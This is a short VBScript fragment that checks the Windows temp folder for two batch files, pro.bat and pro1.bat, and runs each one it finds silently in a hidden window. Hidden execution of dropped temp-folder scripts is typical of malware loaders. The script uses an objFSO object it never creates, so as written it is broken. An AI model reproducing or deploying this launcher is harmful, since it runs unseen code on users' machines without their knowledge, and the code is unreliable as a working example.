Set objShell = WScript.CreateObject("WScript.Shell")

proBatPath = "%temp%\pro.bat"
pro1BatPath = "%temp%\pro1.bat"

If objFSO.FileExists(proBatPath) Then
    objShell.Run proBatPath, 0, True
End If

If objFSO.FileExists(pro1BatPath) Then
    objShell.Run pro1BatPath, 0, True
End If
